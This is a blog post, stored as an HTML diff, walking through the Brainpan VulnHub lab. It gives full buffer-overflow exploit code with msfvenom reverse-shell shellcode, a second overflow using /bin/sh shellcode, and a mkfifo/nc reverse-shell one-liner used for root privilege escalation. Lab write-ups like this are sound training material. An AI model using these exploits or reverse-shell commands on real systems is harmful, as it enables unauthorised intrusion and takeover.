@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="K3nX">
+
+
+
+
+
+<title> Brainpan </title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">K3nX</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">K3nX</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">BrainPan</h1>
+            
+                <div class="post-meta">
+                    
+
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/VulnHub/">VulnHub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="Brainpan"><a href="#Brainpan" class="headerlink" title="Brainpan"></a># Brainpan (VulnHub) </h3>
+<ul>
+<li>This Lab from Vulnhub , name is Brainpan</li>
+<li>You can get this lab image from <a href="https://download.vulnhub.com/brainpan/Brainpan.zip">Here</a></li>
+<li>After setup , we need to find this lab ip address</li>
+<li>Finding Ip address you can use your choice tool but i used netdiscover</li>
+<h3 id="Enumeration"<a href="enumeration" class="headerlink" title="Enumeration"></a># Finding IP Address</h3><pre><code class="bash">$ netdiscover -i enp2s0
+Currently scanning: 172.18.149.0/16   |   Screen View: Unique Hosts                                                                                                                         
+ 3 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 864                                                                                                                            
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.100.1   18:3d:5e:a5:e2:94     12     720  HUAWEI TECHNOLOGIES CO.,LTD                                                                                                               
+ 192.168.100.25  08:00:27:14:78:ed      1      42  PCS Systemtechnik GmbH                                                                                                                    
+ 192.168.100.26  08:00:27:2f:b3:09      1      42  PCS Systemtechnik GmbH                                                                                                                    
+</code></pre>
+
+<h3 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a># Scanning (Nmap)</h3><pre><code class="bash">$ nmap -sSV -O -A -sC oN brainpan.nmap 192.168.100.26
+# Nmap 7.80 scan initiated Mon Sep  7 23:55:37 2020 as: nmap -sSV -O -A -sC -oN brainpan.nmap 192.168.100.26
+Nmap scan report for 192.168.100.26
+Host is up (0.0012s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+| fingerprint-strings: 
+|   NULL: 
+|     _| _| 
+|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
+|     _|_| _| _| _| _| _| _| _| _| _| _| _|
+|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
+|     [________________________ WELCOME TO BRAINPAN _________________________]
+|_    ENTER THE PASSWORD
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+|_http-title: Site doesn't have a title (text/html).
+</code></pre>
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a># Web </h3><ul>
+<li><p>nmap Result show port 9999 and port 10000(Python Simple Http Server) is running </p>
+</li>
+<li><p>I type this ip address in browser , I saw this webpage<br><img src="web.png" alt="Sample Image"></p>
+</li>
+<li><p>I used gobuster to find some interesting and useful dir</p>
+</li>
+</ul>
+<ul>
+<li><p>I found one folder this is /bin , I found one exe file in this folder  <img src="dirsearch.png" alt="Sample Image"></p>
+</li>
+<li>I download this exe file </li>
+<li><p>I used string to see this exe file <br><img src="checkexe.png" alt="Sample Image"></p>
+</li>
+<li><p>I checked port 9999 with nc , In this time I know this brainpan.exe file is running at port 9999  </p>
+<pre><code class="bash">$ nc 192.168.100.26 9999
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD                              
+
+                          >> AAAAAAAAAAAAAAa
+                          ACCESS DENIED
+
+</code></pre>
+</li>
+<li>We need to buffer overflow this<li>
+</ul>
+<h3 id="debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a># Debugging Stage</h3><ul>
+<ul>
+<li><p>I move this exe file to my window machine and open Immunity Debugger and run this exe file </p>
+</li>
+<li>I send 1000 bytes of A and this program is crashed</li>
+<img src="crashed.png" alt="Sample Image">
+<li>EIP and EBP fill with 41414141 (41 is A) </li>
+<li><p>Next Step We need to know how many bytes need to fill our buffer with in order to get us to eip ??  </p>
+</li>
+<li>I used Metasploit pattern_create tool. Let's Create pattern to start </li>
+<pre><code class="bash">$ pattern_create -l 1000 | nc 192.168.100.25 9999 </code></pre>
+<li> Crashed Again and we have successfully overwriten EIP .</li>
+<img src="pattern.png" alt="Sample Image">
+<li>Take note of the EIP address 35724134</li>
+<li>We'll push this address into Metasploit pattern_offet tool , that will give use the number of bytes we need to send to our buffer in order to control EIP</li>
+<pre><code class="bash">$ pattern_offset --query 35724134 
+[*] Exact match at offset 524
+</code></pre>
+<li><p>You can use mona to find this offset <br><img src="monaoffset.png" alt="Sample Image"></p>
+</li>
+<li>Next Step We need to find the address of a jmp esp fucntion. Finding this address is straight forward</li>
+<pre><code class="bash">$ objdump -d brainpan.exe | grep -i jmp | grep -i esp
+311712f3:      ff e4                jmp    *%esp
+</code></pre>
+</ul>
+<h3 id="Generatingshellcode"><a href="#Generating_Shell_Code" class="headerlink" title="Generating_Shell_Code"></a>#Generating Shell Code</h3><ul>
+<li>We need to generatre shell code</li>
+<li>I used this command to generate linux shell code <pre><code class="bash"># msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.20 LPORT=4444 -b '\x00' -f python
+
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of python file: 479 bytes
+buf += b"\xbd\xda\x30\xda\x22\xda\xc7\xd9\x74\x24\xf4\x5a\x2b"
+buf += b"\xc9\xb1\x12\x83\xc2\x04\x31\x6a\x0e\x03\xb0\x3e\x38"
+buf += b"\xd7\x75\xe4\x4b\xfb\x26\x59\xe7\x96\xca\xd4\xe6\xd7"
+buf += b"\xac\x2b\x68\x84\x69\x04\x56\x66\x09\x2d\xd0\x81\x61"
+buf += b"\x6e\x8a\x16\x65\x06\xc9\xd6\x94\x8a\x44\x37\x26\x54"
+buf += b"\x07\xe9\x15\x2a\xa4\x80\x78\x81\x2b\xc0\x12\x74\x03"
+buf += b"\x96\x8a\xe0\x74\x77\x28\x98\x03\x64\xfe\x09\x9d\x8a"
+buf += b"\x4e\xa6\x50\xcc"
+</code></pre>
+</li>
+</ul>
+<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a># Exploitation </h3><ul>
+<li><p>Let's Write Exploit </p>
+</li>
+<li>My Exploit Code is here</li>
+<pre><code class="bash">$ cat exploit.py
+#!/usr/bin/python2
+import socket, sys, os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('192.168.100.26', 9999))
+
+buf =  b"\xbd\xda\x30\xda\x22\xda\xc7\xd9\x74\x24\xf4\x5a\x2b"
+buf += b"\xc9\xb1\x12\x83\xc2\x04\x31\x6a\x0e\x03\xb0\x3e\x38"
+buf += b"\xd7\x75\xe4\x4b\xfb\x26\x59\xe7\x96\xca\xd4\xe6\xd7"
+buf += b"\xac\x2b\x68\x84\x69\x04\x56\x66\x09\x2d\xd0\x81\x61"
+buf += b"\x6e\x8a\x16\x65\x06\xc9\xd6\x94\x8a\x44\x37\x26\x54"
+buf += b"\x07\xe9\x15\x2a\xa4\x80\x78\x81\x2b\xc0\x12\x74\x03"
+buf += b"\x96\x8a\xe0\x74\x77\x28\x98\x03\x64\xfe\x09\x9d\x8a"
+buf += b"\x4e\xa6\x50\xcc"
+
+
+payload = "A" * 524 + "\xf3\x12\x17\x31" +"\x90" * 10 + buf
+
+s.send(payload)
+s.close()
+</code></pre>
+</li>
+<li><p>The Logic of the exploit is :</p>
+</li>
+<pre><code class="bash"> 524 Junk + JMP ESP Address + 10 Bytes NOPS + Shellcode </code></pre>
+<li><p>On the other tab of my terminal , I used ncat to listen at port 4444 and I run this exploit </p>
+</li>
+<li>Boom I got Reverse Shell
+<pre><code class="bash">$ sudo ncat -lvnp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 192.168.100.26.
+Ncat: Connection from 192.168.100.26:42618.
+id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+whoami
+puck
+</code></pre>
+</li>
+<li><p>I got a shell as use puck </p>
+</li>
+<li><p>After finding a few mins, I found one binary file owner is user anansi </p>
+</li>
+<img src="otherbinary.png" alt="Sample Image">
+<li><p>After fuzzing , I know this is buffer overflow vulnerability too.</p>
+</li>
+<li>I created 200 bytes with metasploit pattern_create tool <pre><code class="bash">$ pattern_create -l 200 </code></pre><li>
+<pre><code class="bash">$ gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /vulnhub/Brainpan/validate Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffcf58 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+EBX: 0x41366441 ('Ad6A')
+ECX: 0xffffd350 --> 0x48530067 ('g')
+EDX: 0xffffd01f --> 0x67 ('g')
+ESI: 0xf7f93e1c --> 0x1edd2c 
+EDI: 0xf7f93e1c --> 0x1edd2c 
+EBP: 0x64413764 ('d7Ad')
+ESP: 0xffffcfd0 ("Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+EIP: 0x39644138 ('8Ad9')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x39644138
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcfd0 ("Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0004| 0xffffcfd4 ("e1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0008| 0xffffcfd8 ("2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0012| 0xffffcfdc ("Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0016| 0xffffcfe0 ("e5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0020| 0xffffcfe4 ("6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0024| 0xffffcfe8 ("Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0028| 0xffffcfec ("e9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x39644138 in ?? ()
+</code></pre>
+<li>We need to find the offset <pre><code class="bash">$ pattern_offset -q 39644138
+[*] Exact match at offset 116
+</code></pre></li>
+<li>we found the crash offset value. So we can overwrite the EIP after 116 bytes.</li>
+<li> I’ve tried to find the JMP ESP instructions. But it was not that easy so I couldn’t find it</li>
+<li>After fuzzing with gdb and looked into register  , I noticed EAX value was the same as offet starting address </li>
+<li>This mean we can find CALL EAX address we can jump to our shellcode</li>
+<pre><code class="bash">$ objdump -d validate | grep -i call | grep -i eax
+ 8048468:	ff 14 85 14 9f 04 08 	call   *0x8049f14(,%eax,4)
+ 80484af:	ff d0                	call   *%eax
+ 804862b:	ff d0                	call   *%eax
+</code></pre>
+<li>Finally I found the EAX address and we can exploit this easily </li>
+<li>Our payload: <pre><code class="bash">  MAX[116]Bytes Shellcode + CALL EAX ADDRESS </code></pre></li>
+</ul>
+</a>#Exploitation Part 2</h3><ul>
+<li><p>I search shellcode at google I found this link <a href="http://shell-storm.org/shellcode/files/shellcode-811.php"> 28 bytes Shellcode</a></p></li>
+<li>This is 28 bytes /bin/sh shellcode</li>
+<li>Max 116 - 28 (Shellcode) = 88 </li>
+<li>Finaly payload like : <pre><code class="bash"> "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"  + ("A" * 88) + "\xaf\x84\x04\x08" </code></pre>
+<pre><code class="bash">$ puck@brainpan:/usr/local/bin$ ./validate `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + ("\x41" * 88) + "\xaf\x84\x04\x08"'`
+id
+uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
+whoami
+anansi
+/bin/sh -i
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
+$ whoami
+anansi
+</code></pre>
+</li>
+<li><p>I got user anansi  </p></li>
+</ul>
+<h3 id="Privileges Escalation"><a href="#Privileges Escalation" class="headerlink" title="Privileges Escalation"></a># Privileges Escalation </h3><ul>
+<pre><code class="bash">$ sudo -l
+Matching Defaults entries for puck on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util
+</code></pre>
+<li>After playing with sudo -l , we can find we can run /home/anansi/bin/anansi_util as root </li>
+<li> I replace my reverse shell payload file instead of original anansi_util file </li>
+<pre><code class="bash">$ whereis nc
+nc: /bin/nc /bin/nc.openbsd /usr/share/man/man1/nc.1.gz
+$ cd bin
+$ ls
+anansi_util
+$ rm anansi_util
+$ ls
+$ mv anansi.util anansi.bak
+$ ls
+anansi.bak
+anansi_util
+$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.20 9001 >/tmp/f " > anansi_util 
+$ ls
+anansi.bak
+anansi_util
+$ cat anansi_util
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.20 9001 >/tmp/f
+</code></pre>
+</li>
+<li><p>In other tab of my terminal , I used ncat to listen and i run this anansi_utils file with sudo  </p></li>
+<li>I got reverse shell as root </li>
+<pre><code class="bash">$ sudo ncat -lvnp 9001
+[sudo] password for k3nx: 
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 192.168.100.26.
+Ncat: Connection from 192.168.100.26:50737.
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+# /bin/bash -i
+bash: no job control in this shell
+root@brainpan:/home/anansi/bin# cd
+cd
+root@brainpan:~# ls
+ls
+b.txt
+root@brainpan:~# cat b.txct
+cat b.txct
+root@brainpan:~# cat b.txt
+cat b.txt
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+
+                                              http://www.techorganic.com 
+
+
+
+root@brainpan:~# 
+</code></pre>
+<li><p>Finally I got root Shell</p>
+</li>
+<li><p>Thank for reading , I hope you learn something :"( </p>
+</li>
+</ul>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright K3nX (c) 2019</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/VulnHub/"># VulnHub </a>
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+		<a class="prev" rel="prev" href="/"> / </a>
+            
+            
+            <a class="next" rel="next" href="/hackthebox/machines/passage/">Passage</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© K3nX </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
